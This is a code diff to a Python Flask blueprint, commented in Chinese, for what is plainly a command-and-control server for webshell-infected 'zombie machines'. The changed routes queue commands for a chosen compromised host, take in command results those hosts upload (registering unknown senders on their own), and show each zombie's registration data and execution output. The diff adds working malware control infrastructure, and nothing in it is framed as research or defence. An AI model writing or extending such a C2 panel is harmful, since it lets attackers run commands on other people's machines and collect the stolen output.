@@ -31,13 +31,26 @@ def add_message():
                 flash('消息不能為空！', 'error')
                 return redirect(url_for('control.get_messages'))
 
-        new_message = web_shell_back_point(
-            target_ip=target_ip,
-            target_config=message,
-            created_at=datetime.now()
-        )
-        db.session.add(new_message)
-        db.session.commit()
+        # 檢查是否已存在相同的 target_ip
+        existing_record = web_shell_back_point.query.filter_by(
+            target_ip=target_ip).first()
+
+        if existing_record:
+            # 更新現有記錄
+            existing_record.target_config = message
+            existing_record.created_at = datetime.now()
+            db.session.commit()
+            logger.info(f"更新現有記錄，目標IP: {target_ip}")
+        else:
+            # 創建新記錄
+            new_message = web_shell_back_point(
+                target_ip=target_ip,
+                target_config=message,
+                created_at=datetime.now()
+            )
+            db.session.add(new_message)
+            db.session.commit()
+            logger.info(f"創建新記錄，目標IP: {target_ip}")
         logger.info(
             f"消息添加成功，目標IP: {target_ip},消息: {message},時間: {datetime.now()}")
         if request.method == 'GET':
@@ -189,33 +202,26 @@ def get_zombies():
 
 
 # type: ignore
-@control_bp.route('/add_command_to_do/<zombie_ip>', methods=['POST', 'GET'])
+@control_bp.route('/add_command_to_do/<zombie_ip>', methods=['POST'])
 @log_function_call()
 def add_command_to_do(zombie_ip):
+    """
+    為指定的殭屍機器添加待執行命令 (僅支持POST方法)
+    """
     try:
         logger = LogConfig.get_context_logger()
         logger.info(f"用戶請求為殭屍機器 {zombie_ip} 添加命令")
 
-        if request.method == 'GET':
-            # 返回命令添加頁面
-            return render_template('C2_control/add_command.html', zombie_ip=zombie_ip)
-
-        # POST 請求處理
         # 檢查殭屍機器是否存在
         zombie_record = web_shell_back_point.query.filter_by(
             target_ip=zombie_ip).first()
         if not zombie_record:
-            flash(f'殭屍機器 {zombie_ip} 不存在', 'error')
-            return redirect(url_for('control.get_messages'))
+            return jsonify({'error': f'殭屍機器 {zombie_ip} 不存在'}), 404
 
         # 獲取命令內容
         command = request.form.get('command') or request.args.get('command')
         if not command:
-            if request.method == 'GET':
-                return jsonify({'error': '命令不能為空'})
-            else:
-                flash('命令不能為空！', 'error')
-                return redirect(url_for('control.add_command_to_do', zombie_ip=zombie_ip))
+            return jsonify({'error': '命令不能為空'}), 400
 
         # 更新命令
         zombie_record.to_do_command = command
@@ -223,17 +229,105 @@ def add_command_to_do(zombie_ip):
         db.session.commit()
 
         logger.info(f"成功為殭屍機器 {zombie_ip} 添加命令: {command}")
-
-        if request.method == 'GET':
-            return jsonify({'status': 'success', 'message': '命令添加成功'})
-        else:
-            flash(f'成功為 {zombie_ip} 添加命令！', 'success')
-            return redirect(url_for('control.get_messages'))
+        return jsonify({
+            'status': 'success',
+            'message': f'成功為 {zombie_ip} 添加命令：{command}'
+        })
 
     except Exception as e:
         logger.error(f"添加命令時發生錯誤: {e}")
-        if request.method == 'GET':
-            return jsonify({'error': str(e)}), 500
-        else:
-            flash(f'發生錯誤: {str(e)}', 'error')
-            return redirect(url_for('control.get_messages'))
+        return jsonify({'error': str(e)}), 500
+
+
+@control_bp.route('/send_result', methods=['POST'])
+@log_function_call()
+def send_result():
+    try:
+        logger = LogConfig.get_context_logger()
+        zombie_ip = request.remote_addr
+        result = request.form.get('result')
+        if not result:
+            return jsonify({'error': '結果不能為空'}), 400
+
+        # 查找或創建殭屍機器記錄
+        zombie_record = web_shell_back_point.query.filter_by(
+            target_ip=zombie_ip).first()
+
+        if not zombie_record:
+            # 如果殭屍機器不存在，創建一個基本記錄
+            zombie_record = web_shell_back_point(
+                target_ip=zombie_ip,
+                target_config=f"自動創建記錄 - 來自結果上傳",
+                created_at=datetime.now()
+            )
+            db.session.add(zombie_record)
+            logger.info(f"自動創建殭屍機器記錄: {zombie_ip}")
+
+        # 更新結果
+        zombie_record.target_report = result
+        db.session.commit()
+        logger.info(f"成功為殭屍機器 {zombie_ip} 發送結果: {result}")
+        return jsonify({'status': 'success', 'message': '結果發送成功'})
+    except Exception as e:
+        logger.error(f"發送結果時發生錯誤: {e}")
+        return jsonify({'error': str(e)}), 500
+
+
+# type: ignore
+@control_bp.route('/get_zombie_details/<zombie_ip>', methods=['GET'])
+@log_function_call()
+def get_zombie_details(zombie_ip):
+    """
+    獲取指定殭屍機器的詳細信息和執行結果
+    """
+    try:
+        logger = LogConfig.get_context_logger()
+        logger.info(f"用戶請求查看殭屍機器 {zombie_ip} 的詳細信息")
+
+        # 查找殭屍機器記錄
+        zombie_record = web_shell_back_point.query.filter_by(
+            target_ip=zombie_ip).first()
+
+        if not zombie_record:
+            return jsonify({'error': f'殭屍機器 {zombie_ip} 不存在'}), 404
+
+        # 解析target_config（註冊信息）
+        target_info = {}
+        if zombie_record.target_config:
+            try:
+                target_info = json.loads(zombie_record.target_config)
+            except json.JSONDecodeError:
+                target_info = {'raw_data': zombie_record.target_config}
+
+        # 解析target_report（命令執行結果）
+        execution_results = []
+        if zombie_record.target_report:
+            try:
+                # 嘗試解析為JSON
+                result_data = json.loads(zombie_record.target_report)
+                if isinstance(result_data, list):
+                    execution_results = result_data
+                else:
+                    execution_results = [result_data]
+            except json.JSONDecodeError:
+                # 如果不是JSON，作為純文本處理
+                execution_results = [{
+                    'command': 'Unknown',
+                    'output': zombie_record.target_report,
+                    'timestamp': zombie_record.created_at.isoformat() if zombie_record.created_at else None,
+                    'success': True
+                }]
+
+        return jsonify({
+            'status': 'success',
+            'zombie_ip': zombie_ip,
+            'registration_info': target_info,
+            'current_command': zombie_record.to_do_command,
+            'execution_results': execution_results,
+            'created_at': zombie_record.created_at.isoformat() if zombie_record.created_at else None,
+            'last_seen': zombie_record.created_at.isoformat() if zombie_record.created_at else None
+        })
+
+    except Exception as e:
+        logger.error(f"獲取殭屍機器詳細信息時發生錯誤: {e}")
+        return jsonify({'error': str(e)}), 500
